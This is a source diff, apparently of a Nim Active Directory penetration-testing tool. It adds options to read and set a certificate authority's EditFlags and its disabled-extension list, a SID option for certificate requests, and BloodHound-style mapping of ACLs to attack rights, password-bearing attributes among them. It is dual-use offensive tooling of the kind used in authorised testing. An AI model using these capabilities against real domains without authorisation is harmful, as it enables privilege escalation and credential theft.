@@ -1,4 +1,4 @@
-import std/[asyncdispatch, asyncnet, base64, json, net, os, osproc, parseopt, random, sequtils, strutils, tables, terminal, times, uri, wordwrap]
+import std/[asyncdispatch, asyncnet, base64, json, net, os, osproc, parseopt, random, sequtils, sets, strutils, tables, terminal, times, uri, wordwrap]
 import core/[targets, scanner, output, lineread, proxy]
 import protocols/smb/client as smbclient
 import protocols/ldap/client as ldapclient
@@ -22,6 +22,7 @@ import protocols/kerberos/pkinit as pkinitmod
 import protocols/kerberos/asrep as asrepmod
 import protocols/kerberos/tgs as tgsmod
 import protocols/kerberos/s4u as s4umod
+import protocols/certadmin/client as certadminclient
 import protocols/ssh/client as sshclient
 import protocols/vnc/client as vncclient
 import protocols/ftp/client as ftpclient
@@ -291,7 +292,14 @@ type
     ldapAdcsCcache: string
     ldapAdcsUpn: string
     ldapAdcsDns: string
+    ldapAdcsSid: string
     ldapAdcsOnBehalfOf: string
+    ldapAdcsPolicySet: bool
+    ldapAdcsGetEditFlags: bool
+    ldapAdcsGetDisableExtensionList: bool
+    ldapAdcsSetEditFlags: string
+    ldapAdcsSetDisableExtensionListPresent: bool
+    ldapAdcsSetDisableExtensionList: string
     ldapDecryptMsLaps: bool
     ldapMsLapsBlobOut: string
     ldapGetGmsa: bool
@@ -591,11 +599,15 @@ ATTACK SHORTCUTS
   --cert-map --user <account> --mapping <altSecurityIdentities>
   --cert-map --remove-map --user <account> --mapping <altSecurityIdentities>
   --adcs
-  --adcs-request --ca <name> --template <name> --out <prefix>
+  --adcs-request --ca <name> --template <name> [--out <prefix>] [--sid <objectSid>]
   --adcs-request --ca <name> --template <name> --on-behalf-of <domain\\user>
-  --adcs-request --adcs-rpc --ca <name> --template <name> --out <prefix>
+  --adcs-request --adcs-rpc --ca <name> --template <name> [--out <prefix>]
   --adcs-request --adcs-rpc --ca <name> --template <name> --on-behalf-of <domain\\user> [--cert <ea.cer> --key <ea.key>]
   --adcs-auth --upn <user@realm> --pfx <file> --ccache <file>
+  --adcs-policy --ca <name> --adcs-get-editflags
+  --adcs-policy --ca <name> --adcs-get-disable-extension-list
+  --adcs-policy --ca <name> --adcs-set-editflags <value>
+  --adcs-policy --ca <name> --adcs-set-disable-extension-list <oid[,oid]>
   --adcs-template --template <name> --replace <attr=value>
   --server              Run LDAP NTLM capture server
   --srvhost <ip>        LDAP capture listen address (default 0.0.0.0)
@@ -2073,6 +2085,7 @@ proc parseCli(): CliConfig =
     "add-computer", "computer", "computer-pass", "computer-ou", "ou",
     "computer-dns", "delegate-from", "delegate-to", "restore-to", "new-name", "move-to",
     "bloodhound-out", "ca", "template", "out", "pfx", "upn", "dns-name",
+    "adcs-set-editflags", "adcs-set-disable-extension-list",
     "blob-out", "key", "ccache", "krb5-config", "krb5-conf", "zone", "record", "type", "data", "ttl",
     "database", "ole", "clr", "xp-link", "ole-link", "clr-link", "query-file", "link-chain",
     "exec",
@@ -2689,6 +2702,8 @@ proc parseCli(): CliConfig =
         result.ldapAdcsRpc = true
       of "adcs-auth":
         result.ldapAdcsAuth = true
+      of "adcs-policy":
+        result.ldapAdcsPolicySet = true
       of "ca":
         if result.protocol == "krb5conf" or fileExists(value):
           result.krb5CaPath = value
@@ -2712,7 +2727,10 @@ proc parseCli(): CliConfig =
       of "forge":
         result.krb5Forge = value.toLowerAscii()
       of "sid":
-        result.krb5Sid = value
+        if result.protocol == "ldap" and result.ldapAdcsRequest:
+          result.ldapAdcsSid = value
+        else:
+          result.krb5Sid = value
       of "extra-sid":
         result.krb5ExtraSids.add value
       of "rid":
@@ -3915,6 +3933,52 @@ proc attrsArray(entry: ldapclient.LdapEntry; name: string): JsonNode =
     for value in entry.attrs[name]:
       result.add %value
 
+proc nullableAttr(entry: ldapclient.LdapEntry; name: string): JsonNode =
+  let value = firstAttr(entry, name)
+  if value.len == 0: newJNull() else: %value
+
+proc intAttr(entry: ldapclient.LdapEntry; name: string; defaultValue = 0): int =
+  let value = firstAttr(entry, name)
+  if value.len == 0:
+    return defaultValue
+  try:
+    parseInt(value)
+  except CatchableError:
+    defaultValue
+
+proc adFiletimeUnix(entry: ldapclient.LdapEntry; name: string; defaultValue = 0): int =
+  let value = firstAttr(entry, name)
+  if value.len == 0:
+    return defaultValue
+  try:
+    let ft = parseUInt(value)
+    if ft == 0'u64 or ft == 9223372036854775807'u64:
+      return defaultValue
+    int((ft div 10_000_000'u64) - 11_644_473_600'u64)
+  except CatchableError:
+    defaultValue
+
+proc generalizedTimeUnix(entry: ldapclient.LdapEntry; name: string): int =
+  let value = firstAttr(entry, name)
+  if value.len < 14:
+    return 0
+  try:
+    let year = parseInt(value[0 .. 3])
+    let month = Month(parseInt(value[4 .. 5]))
+    let day = MonthdayRange(parseInt(value[6 .. 7]))
+    let hour = HourRange(parseInt(value[8 .. 9]))
+    let minute = MinuteRange(parseInt(value[10 .. 11]))
+    let second = SecondRange(parseInt(value[12 .. 13]))
+    int(toTime(dateTime(year, month, day, hour, minute, second, zone = utc())).toUnix())
+  except CatchableError:
+    0
+
+proc uacValue(entry: ldapclient.LdapEntry): int =
+  intAttr(entry, "userAccountControl", 0)
+
+proc uacHas(entry: ldapclient.LdapEntry; flag: int): bool =
+  (uacValue(entry) and flag) != 0
+
 proc certificateInventoryEntryJson(entry: ldapclient.LdapEntry): JsonNode =
   result = ldapEntryJson(entry)
   let account =
@@ -3949,58 +4013,169 @@ proc bloodhoundCollectedEmpty(): JsonNode =
 proc dnKey(dn: string): string =
   dn.strip().toLowerAscii()
 
-proc bloodhoundAceRightNames(ace: ldapclient.LdapAce): seq[string] =
+proc bloodhoundLegacySid(sid, domainName: string): string =
+  if sid.startsWith("S-1-5-32-"):
+    domainName.toUpperAscii() & "-" & sid
+  else:
+    sid
+
+proc bhHas(mask: uint32; bit: uint32): bool =
+  (mask and bit) != 0
+
+proc bhHasGenericAll(mask: uint32): bool =
+  bhHas(mask, 0x10000000'u32) or (mask and 0x000F01FF'u32) == 0x000F01FF'u32
+
+proc bhHasGenericWrite(mask: uint32): bool =
+  bhHas(mask, 0x40000000'u32) or (mask and 0x00020028'u32) == 0x00020028'u32
+
+proc bloodhoundEntryClassGuid(entryType: string): string =
+  case entryType
+  of "user":
+    "bf967aba-0de6-11d0-a285-00aa003049e2"
+  of "group":
+    "bf967a9c-0de6-11d0-a285-00aa003049e2"
+  of "computer":
+    "bf967a86-0de6-11d0-a285-00aa003049e2"
+  of "domain":
+    "19195a5b-6da0-11d0-afd3-00c04fd930c9"
+  of "gpo":
+    "f30e3bc2-9ff0-11d1-b603-0000f80367c1"
+  of "organizational-unit":
+    "bf967aa5-0de6-11d0-a285-00aa003049e2"
+  else:
+    ""
+
+proc bloodhoundAceApplies(ace: ldapclient.LdapAce; entryType: string): bool =
+  if (ace.aceFlags and 0x10) != 0 and ace.inheritedObjectType.len > 0:
+    let expected = bloodhoundEntryClassGuid(entryType)
+    return expected.len == 0 or ace.inheritedObjectType.toLowerAscii() == expected
+  true
+
+proc bloodhoundCanWriteProperty(ace: ldapclient.LdapAce; guid: string): bool =
+  if not bhHas(ace.mask, 0x00000020'u32):
+    return false
+  ace.objectType.len == 0 or ace.objectType.toLowerAscii() == guid
+
+proc bloodhoundHasExtendedRight(ace: ldapclient.LdapAce; guid: string): bool =
+  if not bhHas(ace.mask, 0x00000100'u32):
+    return false
+  ace.objectType.len == 0 or ace.objectType.toLowerAscii() == guid
+
+proc bloodhoundAceRightNames(ace: ldapclient.LdapAce; entryType: string; hasLaps: bool): seq[string] =
   if ace.aceType notin [0, 5]:
     return
+  if ace.trusteeSid in ["S-1-3-0", "S-1-5-18", "S-1-5-10"]:
+    return
+  if (ace.aceFlags and 0x08) != 0 and (ace.aceFlags and 0x10) == 0:
+    return
+  if not bloodhoundAceApplies(ace, entryType):
+    return
   let objectType = ace.objectType.toLowerAscii()
-  if "GenericAll" in ace.rights:
-    result.add "GenericAll"
-  if "GenericWrite" in ace.rights:
-    result.add "GenericWrite"
-  if "WriteDACL" in ace.rights:
-    result.add "WriteDacl"
-  if "WriteOwner" in ace.rights:
-    result.add "WriteOwner"
-  if "ControlAccess" in ace.rights:
-    case objectType
-    of "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2":
-      result.add "GetChanges"
-    of "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2":
-      result.add "GetChangesAll"
-    of "89e95b76-444d-4c62-991a-0facbeda640c":
-      result.add "GetChangesInFilteredSet"
-    of "00299570-246d-11d0-a768-00aa006e0529":
-      result.add "ForceChangePassword"
-    else:
-      result.add "ExtendedRight"
-  if "WriteProperty" in ace.rights:
-    case objectType
-    of "bf9679c0-0de6-11d0-a285-00aa003049e2":
-      result.add "AddMember"
-    of "f3a64788-5306-11d1-a9c5-0000f80367c1":
-      result.add "WriteSPN"
-    of "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79":
-      result.add "AddAllowedToAct"
-    else:
-      result.add "WriteProperty"
-  if "Self" in ace.rights:
-    result.add "AddSelf"
 
-proc bloodhoundAces(r: ldapclient.LdapAclResult;
+  if ace.aceType == 5:
+    if bhHasGenericAll(ace.mask) or bhHas(ace.mask, 0x00040000'u32) or
+        bhHas(ace.mask, 0x00080000'u32) or bhHasGenericWrite(ace.mask):
+      if ace.objectType.len > 0 and not bloodhoundAceApplies(ace, entryType):
+        return
+      if bhHasGenericAll(ace.mask):
+        if entryType == "computer" and hasLaps and objectType == "bf9679c0-0de6-11d0-a285-00aa003049e2":
+          result.add "ReadLAPSPassword"
+        else:
+          result.add "GenericAll"
+        return
+      if bhHasGenericWrite(ace.mask):
+        result.add "GenericWrite"
+        if entryType notin ["domain", "computer"]:
+          return
+      if bhHas(ace.mask, 0x00040000'u32):
+        result.add "WriteDacl"
+      if bhHas(ace.mask, 0x00080000'u32):
+        result.add "WriteOwner"
+
+    if bhHas(ace.mask, 0x00000020'u32):
+      if entryType in ["user", "group", "computer", "gpo", "organizational-unit"] and ace.objectType.len == 0:
+        result.add "GenericWrite"
+      if entryType == "group" and bloodhoundCanWriteProperty(ace, "bf9679c0-0de6-11d0-a285-00aa003049e2"):
+        result.add "AddMember"
+      if entryType == "computer" and bloodhoundCanWriteProperty(ace, "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"):
+        result.add "AddAllowedToAct"
+      if entryType in ["computer", "user"] and
+          bloodhoundCanWriteProperty(ace, "4c164200-20c0-11d0-a768-00aa006e0529") and
+          not ace.trusteeSid.endsWith("-512"):
+        result.add "WriteAccountRestrictions"
+      if entryType == "organizational-unit" and
+          bloodhoundCanWriteProperty(ace, "f30e3bbe-9ff0-11d1-b603-0000f80367c1"):
+        result.add "WriteGPLink"
+      if entryType in ["user", "computer"] and
+          objectType == "5b47d60f-6090-40b2-9f37-2a4de88f3063":
+        result.add "AddKeyCredentialLink"
+      if entryType in ["user", "computer"] and
+          objectType == "f3a64788-5306-11d1-a9c5-0000f80367c1":
+        result.add "WriteSPN"
+    elif bhHas(ace.mask, 0x00000008'u32):
+      if entryType == "group" and objectType == "bf9679c0-0de6-11d0-a285-00aa003049e2":
+        result.add "AddSelf"
+
+    if bhHas(ace.mask, 0x00000100'u32):
+      if entryType in ["user", "domain"] and ace.objectType.len == 0:
+        result.add "AllExtendedRights"
+      if entryType == "computer" and ace.objectType.len == 0:
+        result.add "AllExtendedRights"
+      if entryType == "domain" and bloodhoundHasExtendedRight(ace, "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"):
+        result.add "GetChanges"
+      if entryType == "domain" and bloodhoundHasExtendedRight(ace, "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"):
+        result.add "GetChangesAll"
+      if entryType == "domain" and bloodhoundHasExtendedRight(ace, "89e95b76-444d-4c62-991a-0facbeda640c"):
+        result.add "GetChangesInFilteredSet"
+      if entryType in ["user", "computer"] and
+          bloodhoundHasExtendedRight(ace, "00299570-246d-11d0-a768-00aa006e0529"):
+        result.add "ForceChangePassword"
+  else:
+    if bhHasGenericAll(ace.mask):
+      result.add "GenericAll"
+      return
+    if bhHas(ace.mask, 0x00000020'u32) and
+        entryType in ["user", "group", "computer", "gpo", "organizational-unit"]:
+      result.add "GenericWrite"
+    if bhHas(ace.mask, 0x00080000'u32):
+      result.add "WriteOwner"
+    if entryType in ["user", "domain"] and bhHas(ace.mask, 0x00000100'u32):
+      result.add "AllExtendedRights"
+    if entryType == "computer" and bhHas(ace.mask, 0x00000100'u32) and
+        ace.trusteeSid != "S-1-5-32-544" and not ace.trusteeSid.endsWith("-512"):
+      result.add "AllExtendedRights"
+    if bhHas(ace.mask, 0x00040000'u32):
+      result.add "WriteDacl"
+    if bhHas(ace.mask, 0x00000008'u32) and
+        ace.trusteeSid != "S-1-5-32-544" and not ace.trusteeSid.endsWith("-512") and
+        not ace.trusteeSid.endsWith("-519") and entryType == "group":
+      result.add "AddSelf"
+
+proc bloodhoundPrincipalType(sid: string; principalTypes: Table[string, string]): string
+
+proc bloodhoundAces(r: ldapclient.LdapAclResult; domainName, entryType: string;
+                    hasLaps: bool;
                     principalTypes: Table[string, string]): JsonNode =
   result = newJArray()
+  let owner = bloodhoundLegacySid(r.ownerSid, domainName)
+  if owner.len > 0 and owner notin ["S-1-3-0", "S-1-5-18", "S-1-5-10"]:
+    result.add %*{
+      "PrincipalSID": owner,
+      "PrincipalType": bloodhoundPrincipalType(owner, principalTypes),
+      "RightName": "Owns",
+      "IsInherited": false,
+      "InheritanceHash": "",
+      "IsPermissionForOwnerRightsSid": false,
+      "IsInheritedPermissionForOwnerRightsSid": false
+    }
   for ace in r.aces:
-    let sid = ace.trusteeSid
+    let sid = bloodhoundLegacySid(ace.trusteeSid, domainName)
     if sid.len == 0:
       continue
-    let ptype =
-      if sid in principalTypes: principalTypes[sid]
-      elif sid.startsWith("S-1-5-21-"): "Base"
-      else: "Unknown"
-    for right in bloodhoundAceRightNames(ace):
+    for right in bloodhoundAceRightNames(ace, entryType, hasLaps):
       result.add %*{
         "PrincipalSID": sid,
-        "PrincipalType": ptype,
+        "PrincipalType": bloodhoundPrincipalType(sid, principalTypes),
         "RightName": right,
         "IsInherited": (ace.aceFlags and 0x10) != 0,
         "InheritanceHash": "",
@@ -4086,11 +4261,90 @@ proc bloodhoundTrustNode(entry: ldapclient.LdapEntry; domainName: string): JsonN
     "IsDeleted": false
   }
 
+proc bloodhoundLegacyTrustNode(entry: ldapclient.LdapEntry): JsonNode =
+  let partner =
+    if firstAttr(entry, "trustPartner").len > 0: firstAttr(entry, "trustPartner")
+    elif firstAttr(entry, "flatName").len > 0: firstAttr(entry, "flatName")
+    elif firstAttr(entry, "cn").len > 0: firstAttr(entry, "cn")
+    else: entry.dn
+  var targetSid = ""
+  if "securityIdentifier" in entry.attrs and entry.attrs["securityIdentifier"].len > 0:
+    targetSid = sidFromRaw(entry.attrs["securityIdentifier"][0])
+  var direction = 0
+  try:
+    if firstAttr(entry, "trustDirection").len > 0:
+      direction = parseInt(firstAttr(entry, "trustDirection"))
+  except ValueError:
+    direction = 0
+  result = %*{
+    "TargetDomainName": partner.toUpperAscii(),
+    "TargetDomainSid": targetSid,
+    "IsTransitive": false,
+    "TrustDirection": direction,
+    "TrustType": 4,
+    "SidFilteringEnabled": true
+  }
+
 proc bloodhoundFileJson(kind: string; data: JsonNode): JsonNode =
   %*{"data": data, "meta": {"methods": 0, "type": kind, "count": data.len, "version": 6}}
 
 proc bloodhoundLegacyFileJson(kind: string; data: JsonNode): JsonNode =
-  %*{"data": data, "meta": {"methods": 0, "type": kind, "count": data.len, "version": 4}}
+  if kind == "domains":
+    %*{"data": data, "meta": {"type": kind, "count": data.len, "version": 5}}
+  else:
+    %*{"data": data, "meta": {"methods": 0, "type": kind, "count": data.len, "version": 5}}
+
+proc bloodhoundPrimaryGroupSid(entry: ldapclient.LdapEntry; kind, domainSid: string): string =
+  let sid = bloodhoundObjectId(entry, "")
+  let primary = firstAttr(entry, "primaryGroupID")
+  if sid.len > 0 and primary.len > 0:
+    let dash = sid.rfind('-')
+    if dash > 0:
+      return sid[0 ..< dash] & "-" & primary
+  if domainSid.len > 0:
+    case kind
+    of "users":
+      return domainSid & "-513"
+    of "computers":
+      return domainSid & "-515"
+    else:
+      discard
+  ""
+
+proc bloodhoundLegacyPrincipal(entry: ldapclient.LdapEntry; kind, domainName: string): string =
+  let domainUpper = domainName.toUpperAscii()
+  case kind
+  of "computers":
+    let host = firstAttr(entry, "dNSHostName")
+    if host.len > 0: return host.toUpperAscii()
+    let sam = firstAttr(entry, "sAMAccountName")
+    if sam.endsWith("$") and sam.len > 1: return (sam[0 ..< sam.high] & "." & domainName).toUpperAscii()
+  of "gpos":
+    let display = firstAttr(entry, "displayName")
+    if display.len > 0: return (display & "@" & domainUpper).toUpperAscii()
+  of "ous":
+    let name = firstAttr(entry, "name")
+    if name.len > 0: return (name & "@" & domainUpper).toUpperAscii()
+  of "containers":
+    let name =
+      if firstAttr(entry, "name").len > 0: firstAttr(entry, "name")
+      else: firstAttr(entry, "cn")
+    if name.len > 0: return (name & "@" & domainUpper).toUpperAscii()
+  else:
+    let sam = firstAttr(entry, "sAMAccountName")
+    if sam.len > 0: return (sam & "@" & domainUpper).toUpperAscii()
+  let cn = firstAttr(entry, "cn")
+  if cn.len > 0: (cn & "@" & domainUpper).toUpperAscii() else: entry.dn.toUpperAscii()
+
+proc bloodhoundLegacyHighValue(kind: string; sid: string): bool =
+  if kind == "domains":
+    return true
+  if kind == "groups":
+    if sid.endsWith("-512") or sid.endsWith("-516") or sid.endsWith("-519"):
+      return true
+    if sid in ["S-1-5-32-544", "S-1-5-32-548", "S-1-5-32-549", "S-1-5-32-550", "S-1-5-32-551"]:
+      return true
+  false
 
 proc bloodhoundRef(entry: ldapclient.LdapEntry; objectType: string): JsonNode =
   %*{
@@ -4108,6 +4362,170 @@ proc bloodhoundDnRefs(users, groups, computers, gpos: seq[ldapclient.LdapEntry])
     result[dnKey(entry.dn)] = bloodhoundRef(entry, "Computer")
   for entry in gpos:
     result[dnKey(entry.dn)] = bloodhoundRef(entry, "GPO")
+
+proc bloodhoundGuidObjectId(entry: ldapclient.LdapEntry; fallback: string): string =
+  let guid = firstAttr(entry, "objectGUID")
+  if guid.len > 0:
+    var hasBinary = false
+    for ch in guid:
+      let b = ord(ch)
+      if b < 32 or b > 126:
+        hasBinary = true
+        break
+    if guid.len >= 16 and hasBinary:
+      proc hx(i: int): string =
+        const Hex = "0123456789ABCDEF"
+        let b = ord(guid[i]) and 0xff
+        result.add Hex[(b shr 4) and 0xf]
+        result.add Hex[b and 0xf]
+      return hx(3) & hx(2) & hx(1) & hx(0) & "-" &
+        hx(5) & hx(4) & "-" &
+        hx(7) & hx(6) & "-" &
+        hx(8) & hx(9) & "-" &
+        hx(10) & hx(11) & hx(12) & hx(13) & hx(14) & hx(15)
+    if guid.startsWith("{") and guid.endsWith("}") and guid.len > 2:
+      return guid[1 ..< guid.high].toUpperAscii()
+    return guid.toUpperAscii()
+  fallback.toUpperAscii()
+
+proc bloodhoundDefaultUser(domainName, domainSid: string): JsonNode =
+  let domainUpper = domainName.toUpperAscii()
+  %*{
+    "AllowedToDelegate": [],
+    "ObjectIdentifier": domainUpper & "-S-1-5-20",
+    "PrimaryGroupSID": newJNull(),
+    "Properties": {
+      "domain": domainUpper,
+      "domainsid": domainSid,
+      "name": "NT AUTHORITY@" & domainUpper
+    },
+    "Aces": [],
+    "SPNTargets": [],
+    "HasSIDHistory": [],
+    "IsDeleted": false,
+    "IsACLProtected": false
+  }
+
+proc bloodhoundDefaultGroup(domainName, domainSid, objectSid, name: string;
+                            members: JsonNode = nil): JsonNode =
+  let domainUpper = domainName.toUpperAscii()
+  result = %*{
+    "IsDeleted": false,
+    "IsACLProtected": false,
+    "ObjectIdentifier": domainUpper & "-" & objectSid,
+    "Properties": {
+      "domain": domainUpper,
+      "domainsid": domainSid,
+      "name": name.toUpperAscii() & "@" & domainUpper
+    },
+    "Members": [],
+    "Aces": []
+  }
+  if members != nil:
+    result["Members"] = members
+
+proc bloodhoundEnterpriseDcMembers(computers: seq[ldapclient.LdapEntry]): JsonNode =
+  result = newJArray()
+  for entry in computers:
+    if bloodhoundPrimaryGroupSid(entry, "computers", "").endsWith("-516"):
+      result.add bloodhoundRef(entry, "Computer")
+
+proc addBloodhoundMemberOnce(members: JsonNode; objectId, objectType: string) =
+  if members == nil or members.kind != JArray or objectId.len == 0:
+    return
+  for item in members:
+    if item{"ObjectIdentifier"}.getStr() == objectId:
+      return
+  members.add %*{"ObjectIdentifier": objectId, "ObjectType": objectType}
+
+proc addBloodhoundLegacyBuiltinMemberships(node: JsonNode; domainName, domainSid: string) =
+  let oid = node{"ObjectIdentifier"}.getStr()
+  if not node.hasKey("Members") or node["Members"].kind != JArray:
+    node["Members"] = newJArray()
+  let domainUpper = domainName.toUpperAscii()
+  if oid == domainUpper & "-S-1-5-32-545":
+    addBloodhoundMemberOnce(node["Members"], domainSid & "-513", "Group")
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-11", "Group")
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-4", "Group")
+  elif oid == domainUpper & "-S-1-5-32-554":
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-11", "Group")
+  elif oid == domainUpper & "-S-1-5-32-560":
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-9", "Group")
+  elif oid == domainUpper & "-S-1-5-32-568":
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-17", "User")
+  elif oid == domainUpper & "-S-1-5-32-574":
+    addBloodhoundMemberOnce(node["Members"], domainUpper & "-S-1-5-11", "Group")
+
+proc bloodhoundLegacyFilteredContainer(dn: string): bool =
+  let upper = dn.toUpperAscii()
+  if "CN=DOMAINUPDATES,CN=SYSTEM,DC=" in upper:
+    return true
+  if "CN=POLICIES,CN=SYSTEM,DC=" in upper and
+      (upper.startsWith("CN=USER") or upper.startsWith("CN=MACHINE")):
+    return true
+  false
+
+proc bloodhoundLegacyAces(aces: JsonNode): JsonNode =
+  result = newJArray()
+  if aces == nil or aces.kind != JArray:
+    return
+  for ace in aces:
+    let right = ace{"RightName"}.getStr()
+    if right notin [
+      "Owns", "GenericAll", "GenericWrite", "WriteOwner", "WriteDacl",
+      "AllExtendedRights", "AddMember", "AddAllowedToAct", "AddKeyCredentialLink",
+      "WriteSPN", "ReadGMSAPassword", "ReadLAPSPassword", "AddSelf",
+      "ForceChangePassword", "WriteAccountRestrictions", "WriteGPLink",
+      "GetChanges", "GetChangesAll", "GetChangesInFilteredSet"
+    ]:
+      continue
+    result.add %*{
+      "RightName": right,
+      "IsInherited": ace{"IsInherited"}.getBool(false),
+      "PrincipalSID": ace{"PrincipalSID"}.getStr(),
+      "PrincipalType": ace{"PrincipalType"}.getStr("Unknown")
+    }
+
+proc bloodhoundPrincipalType(sid: string; principalTypes: Table[string, string]): string =
+  if sid in principalTypes:
+    principalTypes[sid]
+  elif sid.startsWith("S-1-5-21-"):
+    "Base"
+  else:
+    "Unknown"
+
+proc addBloodhoundLegacyGmsaAces(node: JsonNode; entry: ldapclient.LdapEntry;
+                                 domainName: string;
+                                 principalTypes: Table[string, string]) =
+  if not entry.attrs.hasKey("msDS-GroupMSAMembership") or
+      entry.attrs["msDS-GroupMSAMembership"].len == 0:
+    return
+  if not node.hasKey("Aces") or node["Aces"].kind != JArray:
+    node["Aces"] = newJArray()
+  let parsed = ldapclient.parseSecurityDescriptor(entry.attrs["msDS-GroupMSAMembership"][0])
+  var seen: HashSet[string]
+  let ownerSid = bloodhoundLegacySid(parsed.owner, domainName)
+  if ownerSid.len > 0 and ownerSid notin ["S-1-3-0", "S-1-5-18", "S-1-5-10"]:
+    seen.incl ownerSid
+    node["Aces"].add %*{
+      "RightName": "ReadGMSAPassword",
+      "IsInherited": false,
+      "PrincipalSID": ownerSid,
+      "PrincipalType": bloodhoundPrincipalType(ownerSid, principalTypes)
+    }
+  for ace in parsed.aces:
+    if ace.aceType notin [0, 5]:
+      continue
+    let sid = bloodhoundLegacySid(ace.trusteeSid, domainName)
+    if sid.len == 0 or sid in ["S-1-3-0", "S-1-5-18", "S-1-5-10"] or sid in seen:
+      continue
+    seen.incl sid
+    node["Aces"].add %*{
+      "RightName": "ReadGMSAPassword",
+      "IsInherited": false,
+      "PrincipalSID": sid,
+      "PrincipalType": bloodhoundPrincipalType(sid, principalTypes)
+    }
 
 proc bloodhoundGroupMembers(users, groups, computers: seq[ldapclient.LdapEntry];
                             refsByDn: Table[string, JsonNode]):
@@ -4150,23 +4568,130 @@ proc bloodhoundGroupMembers(users, groups, computers: seq[ldapclient.LdapEntry];
         addMember(entry.dn, refsByDn[memberKey])
   result = membersByDn
 
-proc applyBloodhoundLegacyNodeFixups(node: JsonNode; kind: string;
+proc applyBloodhoundLegacyNodeFixups(node: JsonNode; kind, domainName, domainSid: string;
                                      entry: ldapclient.LdapEntry;
                                      refsByDn: Table[string, JsonNode];
                                      groupMembersByDn: Table[string, JsonNode]) =
+  let props = node["Properties"]
+  if kind == "groups":
+    let oid = node["ObjectIdentifier"].getStr()
+    if oid.startsWith("S-1-5-32-"):
+      node["ObjectIdentifier"] = %(domainName.toUpperAscii() & "-" & oid)
+  props["name"] = %bloodhoundLegacyPrincipal(entry, kind, domainName)
+  props["domain"] = %domainName.toUpperAscii()
+  props["domainsid"] = %domainSid
+  props["distinguishedname"] = %entry.dn.toUpperAscii()
+  let oid = node["ObjectIdentifier"].getStr()
+  props["highvalue"] = %bloodhoundLegacyHighValue(kind, oid)
   case kind
   of "users":
     node["AllowedToDelegate"] = newJArray()
     node["SPNTargets"] = newJArray()
+    node["PrimaryGroupSID"] = %bloodhoundPrimaryGroupSid(entry, "users", domainSid)
+    node["HasSIDHistory"] = newJArray()
+    if props.hasKey("highvalue"): props.delete("highvalue")
+    props["unconstraineddelegation"] = %false
+    props["trustedtoauth"] = %false
+    props["passwordnotreqd"] = %uacHas(entry, 32)
+    props["enabled"] = %not uacHas(entry, 2)
+    props["lastlogon"] = %adFiletimeUnix(entry, "lastLogon")
+    props["lastlogontimestamp"] = %adFiletimeUnix(entry, "lastLogonTimestamp", -1)
+    props["pwdlastset"] = %adFiletimeUnix(entry, "pwdLastSet")
+    props["dontreqpreauth"] = %uacHas(entry, 4194304)
+    props["pwdneverexpires"] = %uacHas(entry, 65536)
+    props["sensitive"] = %uacHas(entry, 1048576)
+    props["serviceprincipalnames"] = attrsArray(entry, "servicePrincipalName")
+    props["hasspn"] = %(attrVals(entry, "servicePrincipalName").len > 0)
+    props["displayname"] = nullableAttr(entry, "displayName")
+    props["email"] = nullableAttr(entry, "mail")
+    props["title"] = nullableAttr(entry, "title")
+    props["homedirectory"] = nullableAttr(entry, "homeDirectory")
+    props["userpassword"] = nullableAttr(entry, "userPassword")
+    props["admincount"] = %(firstAttr(entry, "adminCount") == "1")
+    props["sidhistory"] = attrsArray(entry, "sIDHistory")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
+    props["unixpassword"] = nullableAttr(entry, "unixUserPassword")
+    props["unicodepassword"] = nullableAttr(entry, "unicodePwd")
+    props["logonscript"] = nullableAttr(entry, "scriptPath")
+    props["samaccountname"] = %firstAttr(entry, "sAMAccountName")
+    props["sfupassword"] = nullableAttr(entry, "msSFU30Password")
   of "groups":
+    if props.hasKey("enabled"): props.delete("enabled")
     let key = dnKey(entry.dn)
     node["Members"] =
       if key in groupMembersByDn: groupMembersByDn[key]
       else: newJArray()
+    addBloodhoundLegacyBuiltinMemberships(node, domainName, domainSid)
+    props["admincount"] = %(firstAttr(entry, "adminCount") == "1")
+    props["description"] = nullableAttr(entry, "description")
+    props["samaccountname"] = %firstAttr(entry, "sAMAccountName")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
   of "computers":
     node["AllowedToDelegate"] = newJArray()
+    node["AllowedToAct"] = newJArray()
+    node["PrimaryGroupSID"] = %bloodhoundPrimaryGroupSid(entry, "computers", domainSid)
+    node["HasSIDHistory"] = newJArray()
+    node["Status"] = newJNull()
+    node["LocalAdmins"] = bloodhoundCollectedEmpty()
+    node["PSRemoteUsers"] = bloodhoundCollectedEmpty()
+    node["RemoteDesktopUsers"] = bloodhoundCollectedEmpty()
+    node["DcomUsers"] = bloodhoundCollectedEmpty()
+    node["Sessions"] = bloodhoundCollectedEmpty()
+    node["PrivilegedSessions"] = bloodhoundCollectedEmpty()
+    node["RegistrySessions"] = bloodhoundCollectedEmpty()
+    if props.hasKey("dnshostname"): props.delete("dnshostname")
+    if props.hasKey("highvalue"): props.delete("highvalue")
+    props["unconstraineddelegation"] = %uacHas(entry, 524288)
+    props["enabled"] = %not uacHas(entry, 2)
+    props["trustedtoauth"] = %uacHas(entry, 16777216)
+    props["samaccountname"] = %firstAttr(entry, "sAMAccountName")
+    props["haslaps"] = %(firstAttr(entry, "ms-Mcs-AdmPwd").len > 0)
+    props["lastlogon"] = %adFiletimeUnix(entry, "lastLogon")
+    props["lastlogontimestamp"] = %adFiletimeUnix(entry, "lastLogonTimestamp", -1)
+    props["pwdlastset"] = %adFiletimeUnix(entry, "pwdLastSet")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
+    props["serviceprincipalnames"] = attrsArray(entry, "servicePrincipalName")
+    props["description"] = nullableAttr(entry, "description")
+    props["operatingsystem"] = nullableAttr(entry, "operatingSystem")
+    props["operatingsystemname"] = nullableAttr(entry, "operatingSystem")
+    props["operatingsystemservicepack"] = nullableAttr(entry, "operatingSystemServicePack")
+    props["operatingsystemversion"] = nullableAttr(entry, "operatingSystemVersion")
+    props["sidhistory"] = attrsArray(entry, "sIDHistory")
